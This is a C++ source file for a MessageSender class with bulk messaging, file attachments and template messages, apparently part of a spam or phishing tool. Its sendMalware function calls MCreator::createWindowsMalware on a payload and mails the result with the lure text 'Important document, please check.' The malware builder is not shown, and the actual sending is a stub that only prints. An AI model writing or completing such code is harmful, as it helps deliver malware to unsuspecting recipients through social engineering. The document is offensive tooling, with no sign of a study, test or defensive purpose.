#include "MessageSender.h"
#include "TemplateLoader.h"
#include "Logger.h"
#include "MCreator.h"
#include "URLShortener.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <stdexcept>
#include <curl/curl.h>

void MessageSender::sendBulkMessages(const std::vector<std::string> &recipients, const std::string &message) {
    for (const auto &recipient : recipients) {
        sendMessage(recipient, message);
    }
}

void MessageSender::sendMessageWithAttachment(const std::string &recipient, const std::string &message, const std::string &attachmentPath) {
    std::ifstream file(attachmentPath, std::ios::binary);
    if (!file) {
        Logger::log(Logger::ERROR, "Error opening file: " + attachmentPath);
        throw std::runtime_error("Error opening file: " + attachmentPath);
    }
    std::string attachment((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    Logger::log(Logger::INFO, "Sending message with attachment to " + recipient);
    std::cout << "Sending message with attachment to " << recipient << std::endl;
    std::cout << "Message: " << message << std::endl;
    std::cout << "Attachment: " << attachmentPath << " (size: " << attachment.size() << " bytes)" << std::endl;

    // Actual sending logic using attachment and message
}

void MessageSender::sendTemplateMessage(const std::string &recipient, const std::string &templateName, const std::unordered_map<std::string, std::string> &params) {
    if (!templateLoader) {
        Logger::log(Logger::ERROR, "Template loader not set");
        throw std::runtime_error("Template loader not set");
    }

    std::string templateContent = templateLoader->loadTemplateFromFile(templateName);
    std::string message = templateLoader->fillTemplate(templateContent, params);

    sendMessage(recipient, message);
}

void MessageSender::setTemplateLoader(const std::shared_ptr<TemplateLoader>& loader) {
    templateLoader = loader;
}

void MessageSender::sendMalware(const std::string &recipient, const std::string &payloadPath) {
    std::string malwarePath = MCreator::createWindowsMalware(payloadPath);
    sendMessageWithAttachment(recipient, "Important document, please check.", malwarePath);
}

void MessageSender::sendMessage(const std::string &recipient, const std::string &message) {
    // This function should be implemented by derived classes
    throw std::runtime_error("sendMessage function not implemented");
}




